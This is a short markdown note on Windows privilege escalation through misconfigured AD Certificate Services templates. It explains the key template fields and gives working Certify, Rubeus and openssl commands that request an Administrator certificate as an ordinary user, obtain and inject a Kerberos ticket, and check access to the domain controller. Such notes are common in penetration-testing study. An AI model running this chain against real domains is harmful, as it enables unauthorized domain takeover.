---
title: Windows Server privilege-escalation notes
---

## AD Certificate Services
Being within AD domain where the AD CS is installed, a domain user can request a X.509 certificate for different purposes (including AD authentication via PKINIT feature). AD CS has admin-defined **Certificate Templates** that specify available parameters and values of a requested certificate.

Most important values:

* CA Name - which server is the Certified Authority for the cert.
* Template Name - the name of the cert template.
* Enrollment Rights - who can request (which group of users) such a cert.
* PKI Extended Key Usage - what's the purpose of the cert.

`Certify` is a tool to enumerate and abuse misconfiguration in AD CS (vulnerable certificate templates).

```powershell
# Check possible vulnerabilitis in AD certificates
Certify.exe find /vulnerable
```

If any user can enroll this certificate (e.g. _Domain Users_ group), its purpose is defined as _Client Authentication_ (an user can auth to AD using this cert) and ENROLLEE_SUPLIES_SUBJECT flag is set (subject of the cert is defined by enrollee)... **privilege escalation**! Any user can enroll the certificate for Administrator and use it to perform AD authentication.

```powershell
# Request an certificate for Administrator
Certify.exe request /ca:<ca-name> /template:<template-name> /altname:Administrator

# Request Kerberos TGT using the received certificate
Rubeus.exe asktgt /user:Administrator /certificate:<cert.pfx> /password:password /ptt

# Check if privilege escalation works
dir \\<dc>\C$
```

**NOTE**: Certify.exe returns a `PEM` format certificate. It must be converted into the `PFX` format to use it with `Rubeus`:

```bash
openssl pkcs12 -in <cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <cert.pfx>
```

> **RESOURCES**: [Awesome BlackHat explanation](https://www.youtube.com/watch?v=ejmAIgxFRgM), [corresponding blog post](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

Most `impacket` tools is able to work with TGT authentication.